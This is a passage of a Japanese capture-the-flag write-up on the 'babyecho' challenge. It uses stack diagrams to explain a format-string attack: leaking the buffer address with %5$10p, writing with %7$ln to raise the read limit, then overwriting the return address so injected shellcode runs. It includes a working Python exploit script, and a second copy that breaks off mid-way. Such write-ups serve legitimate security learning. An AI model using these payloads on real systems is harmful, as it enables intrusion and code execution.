<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
</svg></p>

<p>esp+0x1cの位置から標準入力の値の格納バッファーが確保されているようです。</p>

<p>先ほど調査したスタックをみてみると、読み込みバイト数らしき13(=0x0000000d)が2箇所積まれているのがわかります。
IDA pro (demo)で入力待ちになるときの直前の処理を追ってみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/05/18/babyecho-debugging.png" alt="IDA pro demo debugging" /></p>

<p>この入力と出力を繰り返すループ(0x08048FB6)の直前の処理で、サイズ0x420のスタックを用意し、スタック内の値をいくつかセットしているところがあります。この値のセットで、esp+0x14にesp+0x1cのアドレスをセットしている部分があります(0x08048f57)。esp+0x1cは、先ほどの調査より標準入力の値が格納されるバッファーの開始位置です。このことから、先ほど<em>AAAA%5$p</em>を入力して返ってきた値<em>0xffea839c</em>は、標準入力からの値を格納するバッファーのアドレスを指しているということになります。</p>

<p>loc_8048fb6のループを見てみると、&#8221;Reading %d bytes\n&#8221;で表示されるバイト数をesp+0x10からesp+0x04にコピーしている処理があります(0x08048fcc)。printfで&#8221;Reading %d bytes\n&#8221;を表示した後、 esp+0x08に0x0aを入れ、標準入力からの読み取り上限をesp+0x10からesp+0x04にコピーしてセットし、esp+0x1cに標準入力からの値を読み取っています。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,40)">サブルーチンのリターンアドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,80)">&#8220;Reading %d bytes\n&#8221;で表示される数字</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,120)">定数(0x0a)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,160)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,200)">バッファーに読み込むバイト数</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,240)">バッファーの開始アドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,280)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,340)">バッファー領域</text>
</svg></p>

<h2>攻撃手法：format string attack</h2>

<p>これらの調査をもとに、バッファーに読み込むバイト数が格納されているesp+0x10の値を、esp+0x14に格納されているesp+0x1cのアドレスをもとに書き換え、読み込むバイト数の上限を書き換えて、format string attackで攻撃コードを送り込む余地をつくる作戦が考えられます。
アプローチとしては以下の図のようになります。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="red" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000040d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,240)">
<path stroke="#000000" fill="none" d="M0,0h40v60h-12" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(280,190)">
<path stroke="#000000" fill="none" d="M0,110h95v-110h-87" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,40)">1. バッファーのアドレスを取得</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,80)">2. バイト数格納位置の1バイト上位へ移動</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,120)">3. その位置へ入力文字列長を格納</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(310,270)">%5$10p</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(380,240)">addr_buf - 0xb</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(290,205)">%7$ln</text>
</svg></p>

<p>13バイト制限のため、2回に分けてこの方法を試行します。
まず1回目に、<strong>%5$10p</strong>と入力することによって、esp+10に格納されているバッファーのアドレスを取得します。</p>

<p>そのアドレスから0x0bを引くことによって、バッファーの読み込みバイト数が格納されているアドレスの1バイト上位のアドレスを計算します。
これは、一度に送ることができる文字数が制限されていることによって、<strong>自由に大きな数値を指定できないため、</strong>バッファーのバイト数格納位置の1バイト上位に文字列長を書き込む方法をとったためです。今回の最大13バイトの入力という制限下では、最大でも9までしか数値を指定できません。それをそのままバッファー読み込みバイト数に格納しても、現状の13バイトより減ってしまいます。そのため、書き込む位置を上位にずらすことで、結果的にその数値をビットシフトによる掛け算で大きくし、バイト数制限の値を拡張しています。</p>

<p>そして2回目の入力時に、先ほど計算したアドレスへ文字数である4を、%nフォーマット文字列を使って書き込みます。これによって、現在0x0000000bとなっている読み込みバイト数を、0x0000040bに書き換えることができます。</p>

<p>コードは以下のようになります。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>実行してみると、以下のようになりました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
</span><span class='line'>
</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
</span></code></pre></td></tr></table></div></figure>


<p>1度にバッファーに読み込み可能な文字数の上限が変化しました。esp+0x10の値は、esp+0x11に4を書き込んだことから、0x0000040d、すなわち1037になるはずですが、ループを繰り返すたびに値のチェックがあり、1023を超える場合は1023に書き戻す処理があるので、上限が1023 bytesになりました。</p>

<p>これだけあれば、shellcodeを送り込んで実行させることができます。サブルーチンコールの呼び出し元であるリターンアドレスを書き換え、shellcodeを実行させてフラッグを獲得しに行きます。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
<marker id="pointhead" refX="5" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<circle cx="5" cy="5" r="5"/>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_ret</tspan>
<tspan x="0" y="20" dy=".35em">&#8221;%??c$n%??c$n&#8221;</tspan>
<tspan x="0" y="40" dy=".35em">shellcode</tspan>
</text>
</g>
<g class="arrow" transform="translate(260,40)">
<path stroke="#000000" fill="none" d="M0,0h50v320h-42" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,20)">
<path stroke="#000000" fill="none" d="M0,320h10v-20h-10h35v-300h-7" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,80)">- addr_buf - 0x20でaddr_retを求める</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,120)">(addr_ret = リターンアドレスの格納場所)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,160)">- バッファーにshellcodeを書く</text>
<g class="block" transform="translate(325,200)">
<path stroke="#000000" fill="none" d="M0,0h-30" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">addr_retにaddr_shellを書き込む</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,240)">(addr_shell = shellcodeの開始アドレス)</text>
<g class="block" transform="translate(325,280)">
<path stroke="#000000" fill="none" d="M0,0h-15" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">printfからaddr_retにあるアドレスに戻る</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,320)">- shellcodeが実行される</text>
</svg></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
